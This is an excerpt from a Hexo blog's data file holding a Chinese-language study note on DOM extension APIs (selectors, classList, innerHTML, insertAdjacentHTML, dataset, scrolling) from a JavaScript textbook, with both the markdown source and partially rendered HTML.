welcome, <b>\\\"reader\\\"!</b>\";\n// 以上操作得到的结果如下:\n// <div id=\"content\">Hello &amp; welcome, <b>&quot;reader&quot;!</b></div>\n```\n不支持 innerHTML 的元素有:`<col>、<colgroup>、 <frameset>、<head>、<html>、<style>、<table>、<tbody>、<thead>、<tfoot>和<tr>`。\n\n无论什么时候，只要使用 innerHTML 从外部插入 HTML，都应该首先以可靠的方式处理 HTML。\n#### outerHTML 属性\n用法与innerHTML类似，只是包含调用元素。\n#### insertAdjacentHTML()方法\n两个参数:插入位置和要插入的 HTML 文本。第一个参数必须是下列值之一:\n- \"beforebegin\"，在当前元素之前插入一个紧邻的同辈元素; \n- \"afterbegin\"，在当前元素之下插入一个新的子元素或在第一个子元素之前再插入新的子元素;\n- \"beforeend\"，在当前元素之下插入一个新的子元素或在最后一个子元素之后再插入新的子元素;\n- \"afterend\"，在当前元素之后插入一个紧邻的同辈元素。\n\n第二个参数是一个HTML字符串：\n```js\n//作为前一个同辈元素插入\nelement.insertAdjacentHTML(\"beforebegin\", \"<p>Hello world!</p>\");\n//作为第一个子元素插入\nelement.insertAdjacentHTML(\"afterbegin\", \"<p>Hello world!</p>\");\n//作为最后一个子元素插入\nelement.insertAdjacentHTML(\"beforeend\", \"<p>Hello world!</p>\");\n//作为后一个同辈元素插入\nelement.insertAdjacentHTML(\"afterend\", \"<p>Hello world!</p>\");\n```\n#### 内存与性能问题\n在使用 innerHTML、 outerHTML 属性和 insertAdjacentHTML()方法时，最好先手工删除要被替换的元素的所有事件处理 程序和 JavaScript 对象属性(第 13 章将进一步讨论事件处理程序)。\n\n另外，对于DOM操作，尽量减少次数，例如下面示例：\n```js\nfor (var i=0, len=values.length; i < len; i++){\n  ul.innerHTML += \"<li>\" + values[i] + \"</li>\"; //要避免这种频繁操作!!\n}\n// 应该如下处理\nvar itemsHtml = \"\";\nfor (var i=0, len=values.length; i < len; i++){\n  itemsHtml += \"<li>\" + values[i] + \"</li>\";\n}\nul.innerHTML = itemsHtml;\n```\n\n\n\n### scrollIntoView()方法（了解）\nscrollIntoView()可以在所有 HTML 元素上调用，通过滚动浏览器窗口或某个容器元素，调用 元素就可以出现在视口中。如果给这个方法传入 true 作为参数，或者不传入任何参数，那么窗口滚动 之后会让调用元素的顶部与视口顶部尽可能平齐。如果传入 false 作为参数，调用元素会尽可能全部 出现在视口中，(可能的话，调用元素的底部会与视口顶部平齐。)不过顶部不一定平齐，例如:\n//让元素可见 document.forms[0].scrollIntoView();\n当页面发生变化时，一般会用这个方法来吸引用户的注意力。实际上，为某个元素设置焦点也会导 致浏览器滚动并显示出获得焦点的元素。\n支持 scrollIntoView()方法的浏览器有 IE、Firefox、Safari 和 Opera。\n\n\n## 专有扩展\n### 文档模式\nIE可以设置文档模式：\n```html\n<!-- 语法 -->\n<meta http-equiv=\"X-UA-Compatible\" content=\"IE=IEVersion\">\n<!-- 示例 -->\n<meta http-equiv=\"X-UA-Compatible\" content=\"IE=Edge\">\n```\n```js\n// 获得文档模式\nvar mode = document.documentMode;\n```\n### children属性\n这个属性是 HTMLCollection 的实例，只包含元素中同样还是元素的子节点。除此之外， children 属性与 childNodes 没有什么区别\n### contains()方法\n判断某个节点是不是另一个节点的后代。\n```js\nalert(document.documentElement.contains(document.body)); //true\n```\n使用 DOM Level 3 compareDocumentPosition()也能够确定节点间的关系。\n\n通用的contains函数：\n```js\nfunction contains(refNode, otherNode){\n  if (typeof refNode.contains == \"function\" &&\n          (!client.engine.webkit || client.engine.webkit >= 522)){\n      return refNode.contains(otherNode);\n  } else if (typeof refNode.compareDocumentPosition == \"function\"){\n      return !!(refNode.compareDocumentPosition(otherNode) & 16);\n  } else {\n    var node = otherNode.parentNode;\n    do {\n        if (node === refNode){\n            return true;\n        } else {\n            node = node.parentNode;\n        }\n    } while (node !== null);\n          return false;\n  }\n}\n```\n### 插入文本\n#### innerText 属性\n通过 innertText 属性可以操作元素中包含的所有文本内容，包括子文档树中的文本。\n\n可以通过 innerText 属性过滤掉 HTML 标签：\n```js\ndiv.innerText = div.innerText;\n\n// 兼容函数\nfunction getInnerText(element){\n    return (typeof element.textContent == \"string\") ?\n        element.textContent : element.innerText;\n}\nfunction setInnerText(element, text){\n    if (typeof element.textContent == \"string\"){\n        element.textContent = text;\n    } else {\n        element.innerText = text;\n    }\n}\n```\n#### outerText 属性\n除了作用范围扩大到了包含调用它的节点之外，outerText 与 innerText 基本上没有多大区别。\n### 滚动\n- scrollIntoViewIfNeeded(alignCenter):只在当前元素在视口中不可见的情况下，才滚 动浏览器窗口或容器元素，最终让它可见。如果当前元素在视口中可见，这个方法什么也不做。 如果将可选的 alignCenter 参数设置为 true，则表示尽量将元素显示在视口中部(垂直方向)。 10 Safari 和 Chrome 实现了这个方法。\n- scrollByLines(lineCount):将元素的内容滚动指定的行高，lineCount 值可以是正值， 也可以是负值。Safari 和 Chrome 实现了这个方法。\n- scrollByPages(pageCount):将元素的内容滚动指定的页面高度，具体高度由元素的高度决 定。Safari 和 Chrome 实现了这个方法。\n\n希望大家要注意的是，scrollIntoView()和scrollIntoViewIfNeeded()的作用对象是元素的 容器，而 scrollByLines()和 scrollByPages()影响的则是元素自身。\n```js\n//将页面主体滚动 \ndocument.body.scrollByLines(5);\n//在当前元素不可见的时候，让它进入浏览器的视口\ndocument.images[0].scrollIntoViewIfNeeded();\n//将页面主体往回滚动\ndocument.body.scrollByPages(-1);\n```\n由于 scrollIntoView()是唯一一个所有浏览器都支持的方法，因此还是这个方法最常用。\n# 后记","source":"_posts/2019/01/2019-01-30-JS高设3版-11.md","raw":"---\ntitle: DOM扩展（《JavaScript高级程序设计》）\ntags:\n  - JavaScript\n  - 笔记\ncategories:\n  - 前端\ndate: 2019-01-30 21:32:08\nupdated: 2019-01-30 21:32:08\n---\n# 前言\n重读《JavaScript高级程序设计》，温故而知新。\n# 概述\n重点掌握\n1. 选择符API\n`querySelector,querySelectorAll,matchesSelector`\n2. 元素遍历\n`childElementCount,firstElementChild,lastElementChild,previouseElementSibling,nextElementSibling`\n3. 其他\n`getElementsByClassName,classList,activeElement,hasFocus,readyState,compatMode,head,charset,innerHTML,innerText`\n\n<!-- more -->\n# 详述\n## 选择符 API\nquerySelector()方法接收一个 CSS 选择符，返回与该模式匹配的第一个元素，如果没有找到匹配的元素，返回 null。\n\nquerySelectorAll()方法接收的参数与 querySelector()方法一样，都是一个 CSS 选择符，但返回的是所有匹配的元素而不仅仅是一个元素。这个方法返回的是一个 类 NodeList 的实例，但是是快照非动态查询。\n\nSelectors API Level 2规范为Element类型新增了一个方法matchesSelector()。这个方法接收 一个参数，即 CSS 选择符，如果调用元素与该选择符匹配，返回 true;否则，返回 false。看例子。\n```js\nif (document.body.matchesSelector(\"body.page1\")){\n  //true\n}\n// 兼容写法\nfunction matchesSelector(element, selector){\n        if (element.matchesSelector){\n            return element.matchesSelector(selector);\n        } else if (element.msMatchesSelector){\n            return element.msMatchesSelector(selector);\n        } else if (element.mozMatchesSelector){\n            return element.mozMatchesSelector(selector);\n        } else if (element.webkitMatchesSelector){\n            return element.webkitMatchesSelector(selector);\n        } else {\n            throw new Error(\"Not supported.\");\n        }\n}\nif (matchesSelector(document.body, \"body.page1\")){ //执行操作\n}\n```\n\n\n\n## 元素遍历\nElement Traversal API 为 DOM 元素添加了以下 5 个属性。\n- childElementCount:返回子元素(不包括文本节点和注释)的个数。\n- firstElementChild:指向第一个子元素;firstChild 的元素版。\n- lastElementChild:指向最后一个子元素;lastChild 的元素版。\n- previousElementSibling:指向前一个同辈元素;previousSibling 的元素版。 \n- nextElementSibling:指向后一个同辈元素;nextSibling 的元素版。\n\n兼容性：IE 9+、Firefox 3.5+、Safari 4+、Chrome 和 Opera 10+\n\n## HTML5\n### getElementsByClassName()方法\ngetElementsByClassName()方法接收一个参数，即一个包含一或多个类名的字符串，返回带有 指定类的所有元素的 NodeList。传入多个类名时，类名的先后顺序不重要。注意，同样可能涉及性能问题。\n```js\n//取得所有类中包含\"username\"和\"current\"的元素，类名的先后顺序无所谓\nvar allCurrentUsernames = document.getElementsByClassName(\"username current\");\n```\n\n### classList 属性\n这个 classList 属性是新集合类型 DOMTokenList 的实例。与其他 DOM 集合类似，有length属性，每个元素可以用item()方法或者方括号语法访问。\n\n add(value):将给定的字符串值添加到列表中。如果值已经存在，就不添加了。\n contains(value):表示列表中是否存在给定的值，如果存在则返回 true，否则返回 false。 2  remove(value):从列表中删除给定的字符串。\n toggle(value):如果列表中已经存在给定的值，删除它;如果列表中没有给定的值，添加它。\n```js\n//删除\"disabled\"类 \ndiv.classList.remove(\"disabled\");\n//添加\"current\"类 \n div.classList.add(\"current\");\n//切换\"user\"类 \ndiv.classList.toggle(\"user\");\n//确定元素中是否包含既定的类名\nif (div.classList.contains(\"bd\") && !div.classList.contains(\"disabled\")){\n  //执行操作 \n)\n //迭代类名\nfor (var i=0, len=div.classList.length; i < len; i++){\n  doSomething(div.classList[i]);\n}\n```\n兼容性： Firefox 3.6+和 Chrome。\n\n### 焦点管理\ndocument.activeElement,document.hasFocus()\n\n```js\nvar button = document.getElementById(\"myButton\");\nbutton.focus();\nalert(document.activeElement === button);   //true\n\nvar button = document.getElementById(\"myButton\");\nbutton.focus();\nalert(document.hasFocus());  //true\n```\n兼容性：IE 4+、Firefox 3+、Safari 4+、Chrome 和 Opera 8+\n\n### HTMLDocument的变化\nreadyState 属性\nDocument 的 readyState 属性有两个可能的值:\n- loading，正在加载文档;\n- complete，已经加载完文档。\n```js\nif (document.readyState == \"complete\"){ \n  //执行操作\n}\n```\n兼容模式\n```js\nif (document.compatMode == \"CSS1Compat\"){\n        alert(\"Standards mode\");\n    } else {\n        alert(\"Quirks mode\");\n}\n```\nhead属性\n```js\nvar head = document.head || document.getElementsByTagName(\"head\")[0];\n```\n\n### 字符集属性\ncharset 和 defaultCharset\n```js\nalert(document.charset); //\"UTF-16\"\ndocument.charset = \"UTF-8\";\n```\n\n### 自定义数据属性\n以data-开头，用元素的dataset属性访问。\n```js\n<div id=\"myDiv\" data-appId=\"12345\" data-myname=\"Nicholas\"></div>\n\n//本例中使用的方法仅用于演示\nvar div = document.getElementById(\"myDiv\");\n//取得自定义属性的值\nvar appId = div.dataset.appId; var myName = div.dataset.myname;\n//设置值\ndiv.dataset.appId = 23456; div.dataset.myname = \"Michael\";\n//有没有\"myname\"值呢?\nif (div.dataset.myname){\n  alert(\"Hello, \" + div.dataset.myname);\n}\n```\n\n### 插入标记\n#### innerHTML 属性\n```js\ndiv.innerHTML = \"Hello world!\";\ndiv.innerHTML = \"Hello & welcome, <b>\\\"reader\\\"!</b>\";\n// 以上操作得到的结果如下:\n// <div id=\"content\">Hello &amp; welcome, <b>&quot;reader&quot;!</b></div>\n```\n不支持 innerHTML 的元素有:`<col>、<colgroup>、 <frameset>、<head>、<html>、<style>、<table>、<tbody>、<thead>、<tfoot>和<tr>`。\n\n无论什么时候，只要使用 innerHTML 从外部插入 HTML，都应该首先以可靠的方式处理 HTML。\n#### outerHTML 属性\n用法与innerHTML类似，只是包含调用元素。\n#### insertAdjacentHTML()方法\n两个参数:插入位置和要插入的 HTML 文本。第一个参数必须是下列值之一:\n- \"beforebegin\"，在当前元素之前插入一个紧邻的同辈元素; \n- \"afterbegin\"，在当前元素之下插入一个新的子元素或在第一个子元素之前再插入新的子元素;\n- \"beforeend\"，在当前元素之下插入一个新的子元素或在最后一个子元素之后再插入新的子元素;\n- \"afterend\"，在当前元素之后插入一个紧邻的同辈元素。\n\n第二个参数是一个HTML字符串：\n```js\n//作为前一个同辈元素插入\nelement.insertAdjacentHTML(\"beforebegin\", \"<p>Hello world!</p>\");\n//作为第一个子元素插入\nelement.insertAdjacentHTML(\"afterbegin\", \"<p>Hello world!</p>\");\n//作为最后一个子元素插入\nelement.insertAdjacentHTML(\"beforeend\", \"<p>Hello world!</p>\");\n//作为后一个同辈元素插入\nelement.insertAdjacentHTML(\"afterend\", \"<p>Hello world!</p>\");\n```\n#### 内存与性能问题\n在使用 innerHTML、 outerHTML 属性和 insertAdjacentHTML()方法时，最好先手工删除要被替换的元素的所有事件处理 程序和 JavaScript 对象属性(第 13 章将进一步讨论事件处理程序)。\n\n另外，对于DOM操作，尽量减少次数，例如下面示例：\n```js\nfor (var i=0, len=values.length; i < len; i++){\n  ul.innerHTML += \"<li>\" + values[i] + \"</li>\"; //要避免这种频繁操作!!\n}\n// 应该如下处理\nvar itemsHtml = \"\";\nfor (var i=0, len=values.length; i < len; i++){\n  itemsHtml += \"<li>\" + values[i] + \"</li>\";\n}\nul.innerHTML = itemsHtml;\n```\n\n\n\n### scrollIntoView()方法（了解）\nscrollIntoView()可以在所有 HTML 元素上调用，通过滚动浏览器窗口或某个容器元素，调用 元素就可以出现在视口中。如果给这个方法传入 true 作为参数，或者不传入任何参数，那么窗口滚动 之后会让调用元素的顶部与视口顶部尽可能平齐。如果传入 false 作为参数，调用元素会尽可能全部 出现在视口中，(可能的话，调用元素的底部会与视口顶部平齐。)不过顶部不一定平齐，例如:\n//让元素可见 document.forms[0].scrollIntoView();\n当页面发生变化时，一般会用这个方法来吸引用户的注意力。实际上，为某个元素设置焦点也会导 致浏览器滚动并显示出获得焦点的元素。\n支持 scrollIntoView()方法的浏览器有 IE、Firefox、Safari 和 Opera。\n\n\n## 专有扩展\n### 文档模式\nIE可以设置文档模式：\n```html\n<!-- 语法 -->\n<meta http-equiv=\"X-UA-Compatible\" content=\"IE=IEVersion\">\n<!-- 示例 -->\n<meta http-equiv=\"X-UA-Compatible\" content=\"IE=Edge\">\n```\n```js\n// 获得文档模式\nvar mode = document.documentMode;\n```\n### children属性\n这个属性是 HTMLCollection 的实例，只包含元素中同样还是元素的子节点。除此之外， children 属性与 childNodes 没有什么区别\n### contains()方法\n判断某个节点是不是另一个节点的后代。\n```js\nalert(document.documentElement.contains(document.body)); //true\n```\n使用 DOM Level 3 compareDocumentPosition()也能够确定节点间的关系。\n\n通用的contains函数：\n```js\nfunction contains(refNode, otherNode){\n  if (typeof refNode.contains == \"function\" &&\n          (!client.engine.webkit || client.engine.webkit >= 522)){\n      return refNode.contains(otherNode);\n  } else if (typeof refNode.compareDocumentPosition == \"function\"){\n      return !!(refNode.compareDocumentPosition(otherNode) & 16);\n  } else {\n    var node = otherNode.parentNode;\n    do {\n        if (node === refNode){\n            return true;\n        } else {\n            node = node.parentNode;\n        }\n    } while (node !== null);\n          return false;\n  }\n}\n```\n### 插入文本\n#### innerText 属性\n通过 innertText 属性可以操作元素中包含的所有文本内容，包括子文档树中的文本。\n\n可以通过 innerText 属性过滤掉 HTML 标签：\n```js\ndiv.innerText = div.innerText;\n\n// 兼容函数\nfunction getInnerText(element){\n    return (typeof element.textContent == \"string\") ?\n        element.textContent : element.innerText;\n}\nfunction setInnerText(element, text){\n    if (typeof element.textContent == \"string\"){\n        element.textContent = text;\n    } else {\n        element.innerText = text;\n    }\n}\n```\n#### outerText 属性\n除了作用范围扩大到了包含调用它的节点之外，outerText 与 innerText 基本上没有多大区别。\n### 滚动\n- scrollIntoViewIfNeeded(alignCenter):只在当前元素在视口中不可见的情况下，才滚 动浏览器窗口或容器元素，最终让它可见。如果当前元素在视口中可见，这个方法什么也不做。 如果将可选的 alignCenter 参数设置为 true，则表示尽量将元素显示在视口中部(垂直方向)。 10 Safari 和 Chrome 实现了这个方法。\n- scrollByLines(lineCount):将元素的内容滚动指定的行高，lineCount 值可以是正值， 也可以是负值。Safari 和 Chrome 实现了这个方法。\n- scrollByPages(pageCount):将元素的内容滚动指定的页面高度，具体高度由元素的高度决 定。Safari 和 Chrome 实现了这个方法。\n\n希望大家要注意的是，scrollIntoView()和scrollIntoViewIfNeeded()的作用对象是元素的 容器，而 scrollByLines()和 scrollByPages()影响的则是元素自身。\n```js\n//将页面主体滚动 \ndocument.body.scrollByLines(5);\n//在当前元素不可见的时候，让它进入浏览器的视口\ndocument.images[0].scrollIntoViewIfNeeded();\n//将页面主体往回滚动\ndocument.body.scrollByPages(-1);\n```\n由于 scrollIntoView()是唯一一个所有浏览器都支持的方法，因此还是这个方法最常用。\n# 后记","slug":"2019-01-30-JS高设3版-11","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d91500anwovv4rlvvrz9","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>重读《JavaScript高级程序设计》，温故而知新。</p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>重点掌握</p>\n<ol>\n<li>选择符API<br><code>querySelector,querySelectorAll,matchesSelector</code></li>\n<li>元素遍历<br><code>childElementCount,firstElementChild,lastElementChild,previouseElementSibling,nextElementSibling</code></li>\n<li>其他<br><code>getElementsByClassName,classList,activeElement,hasFocus,readyState,compatMode,head,charset,innerHTML,innerText</code></li>\n</ol>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"选择符-API\"><a href=\"#选择符-API\" class=\"headerlink\" title=\"选择符 API\"></a>选择符 API</h2><p>querySelector()方法接收一个 CSS 选择符，返回与该模式匹配的第一个元素，如果没有找到匹配的元素，返回 null。</p>\n<p>querySelectorAll()方法接收的参数与 querySelector()方法一样，都是一个 CSS 选择符，但返回的是所有匹配的元素而不仅仅是一个元素。这个方法返回的是一个 类 NodeList 的实例，但是是快照非动态查询。</p>\n<p>Selectors API Level 2规范为Element类型新增了一个方法matchesSelector()。这个方法接收 一个参数，即 CSS 选择符，如果调用元素与该选择符匹配，返回 true;否则，返回 false。看例子。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"built_in\">document</span>.body.matchesSelector(<span class=\"string\">\"body.page1\"</span>))&#123;</span><br><span class=\"line\">  <span class=\"comment\">//true</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 兼容写法</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">matchesSelector</span>(<span class=\"params\">element, selector</span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (element.matchesSelector)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> element.matchesSelector(selector);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (element.msMatchesSelector)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> element.msMatchesSelector(selector);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (element.mozMatchesSelector)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> element.mozMatchesSelector(selector);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (element.webkitMatchesSelector)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> element.webkitMatchesSelector(selector);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>(<span class=\"string\">\"Not supported.\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (matchesSelector(<span class=\"built_in\">document</span>.body, <span class=\"string\">\"body.page1\"</span>))&#123; <span class=\"comment\">//执行操作</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"元素遍历\"><a href=\"#元素遍历\" class=\"headerlink\" title=\"元素遍历\"></a>元素遍历</h2><p>Element Traversal API 为 DOM 元素添加了以下 5 个属性。</p>\n<ul>\n<li>childElementCount:返回子元素(不包括文本节点和注释)的个数。</li>\n<li>firstElementChild:指向第一个子元素;firstChild 的元素版。</li>\n<li>lastElementChild:指向最后一个子元素;lastChild 的元素版。</li>\n<li>previousElementSibling:指向前一个同辈元素;previousSibling 的元素版。 </li>\n<li>nextElementSibling:指向后一个同辈元素;nextSibling 的元素版。</li>\n</ul>\n<p>兼容性：IE 9+、Firefox 3.5+、Safari 4+、Chrome 和 Opera 10+</p>\n<h2 id=\"HTML5\"><a href=\"#HTML5\" class=\"headerlink\" title=\"HTML5\"></a>HTML5</h2><h3 id=\"getElementsByClassName-方法\"><a href=\"#getElementsByClassName-方法\" class=\"headerlink\" title=\"getElementsByClassName()方法\"></a>getElementsByClassName()方法</h3><p>getElementsByClassName()方法接收一个参数，即一个包含一或多个类名的字符串，返回带有 指定类的所有元素的 NodeList。传入多个类名时，类名的先后顺序不重要。注意，同样可能涉及性能问题。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//取得所有类中包含\"username\"和\"current\"的元素，类名的先后顺序无所谓</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> allCurrentUsernames = <span class=\"built_in\">document</span>.getElementsByClassName(<span class=\"string\">\"username current\"</span>);</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"classList-属性\"><a href=\"#classList-属性\" class=\"headerlink\" title=\"classList 属性\"></a>classList 属性</h3><p>这个 classList 属性是新集合类型 DOMTokenList 的实例。与其他 DOM 集合类似，有length属性，每个元素可以用item()方法或者方括号语法访问。</p>\n<p> add(value):将给定的字符串值添加到列表中。如果值已经存在，就不添加了。<br> contains(value):表示列表中是否存在给定的值，如果存在则返回 true，否则返回 false。 2  remove(value):从列表中删除给定的字符串。<br> toggle(value):如果列表中已经存在给定的值，删除它;如果列表中没有给定的值，添加它。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//删除\"disabled\"类 </span></span><br><span class=\"line\">div.classList.remove(<span class=\"string\">\"disabled\"</span>);</span><br><span class=\"line\"><span class=\"comment\">//添加\"current\"类 </span></span><br><span class=\"line\"> div.classList.add(<span class=\"string\">\"current\"</span>);</span><br><span class=\"line\"><span class=\"comment\">//切换\"user\"类 </span></span><br><span class=\"line\">div.classList.toggle(<span class=\"string\">\"user\"</span>);</span><br><span class=\"line\"><span class=\"comment\">//确定元素中是否包含既定的类名</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (div.classList.contains(<span class=\"string\">\"bd\"</span>) &amp;&amp; !div.classList.contains(<span class=\"string\">\"disabled\"</span>))&#123;</span><br><span class=\"line\">  <span class=\"comment\">//执行操作 </span></span><br><span class=\"line\">)</span><br><span class=\"line\"> <span class=\"comment\">//迭代类名</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i=<span class=\"number\">0</span>, len=div.classList.length; i &lt; len; i++)&#123;</span><br><span class=\"line\">  doSomething(div.classList[i]);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>兼容性： Firefox 3.6+和 Chrome。</p>\n<h3 id=\"焦点管理\"><a href=\"#焦点管理\" class=\"headerlink\" title=\"焦点管理\"></a>焦点管理</h3><p>document.activeElement,document.hasFocus()</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> button = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">\"myButton\"</span>);</span><br><span class=\"line\">button.focus();</span><br><span class=\"line\">alert(<span class=\"built_in\">document</span>.activeElement === button);   <span class=\"comment\">//true</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> button = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">\"myButton\"</span>);</span><br><span class=\"line\">button.focus();</span><br><span class=\"line\">alert(<span class=\"built_in\">document</span>.hasFocus());  <span class=\"comment\">//true</span></span><br></pre></td></tr></table></figure>\n<p>兼容性：IE 4+、Firefox 3+、Safari 4+、Chrome 和 Opera 8+</p>\n<h3 id=\"HTMLDocument的变化\"><a href=\"#HTMLDocument的变化\" class=\"headerlink\" title=\"HTMLDocument的变化\"></a>HTMLDocument的变化</h3><p>readyState 属性<br>Document 的 readyState 属性有两个可能的值:</p>\n<ul>\n<li>loading，正在加载文档;</li>\n<li>complete，已经加载完文档。<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"built_in\">document</span>.readyState == <span class=\"string\">\"complete\"</span>)&#123; </span><br><span class=\"line\">  <span class=\"comment\">//执行操作</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>兼容模式<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"built_in\">document</span>.compatMode == <span class=\"string\">\"CSS1Compat\"</span>)&#123;</span><br><span class=\"line\">        alert(<span class=\"string\">\"Standards mode\"</span>);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        alert(<span class=\"string\">\"Quirks mode\"</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>head属性<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> head = <span class=\"built_in\">document</span>.head || <span class=\"built_in\">document</span>.getElementsByTagName(<span class=\"string\">\"head\"</span>)[<span class=\"number\">0</span>];</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"字符集属性\"><a href=\"#字符集属性\" class=\"headerlink\" title=\"字符集属性\"></a>字符集属性</h3><p>charset 和 defaultCharset<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">alert(<span class=\"built_in\">document</span>.charset); <span class=\"comment\">//\"UTF-16\"</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.charset = <span class=\"string\">\"UTF-8\"</span>;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"自定义数据属性\"><a href=\"#自定义数据属性\" class=\"headerlink\" title=\"自定义数据属性\"></a>自定义数据属性</h3><p>以data-开头，用元素的dataset属性访问。<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div id=<span class=\"string\">\"myDiv\"</span> data-appId=<span class=\"string\">\"12345\"</span> data-myname=<span class=\"string\">\"Nicholas\"</span>&gt;<span class=\"xml\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//本例中使用的方法仅用于演示</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> div = <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">\"myDiv\"</span>);</span><br><span class=\"line\"><span class=\"comment\">//取得自定义属性的值</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> appId = div.dataset.appId; <span class=\"keyword\">var</span> myName = div.dataset.myname;</span><br><span class=\"line\"><span class=\"comment\">//设置值</span></span><br><span class=\"line\">div.dataset.appId = <span class=\"number\">23456</span>; div.dataset.myname = <span class=\"string\">\"Michael\"</span>;</span><br><span class=\"line\"><span class=\"comment\">//有没有\"myname\"值呢?</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (div.dataset.myname)&#123;</span><br><span class=\"line\">  alert(<span class=\"string\">\"Hello, \"</span> + div.dataset.myname);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"插入标记\"><a href=\"#插入标记\" class=\"headerlink\" title=\"插入标记\"></a>插入标记</h3><h4 id=\"innerHTML-属性\"><a href=\"#innerHTML-属性\" class=\"headerlink\" title=\"innerHTML 属性\"></a>innerHTML 属性</h4><figure class=\"highlight js\"><table><tr><td 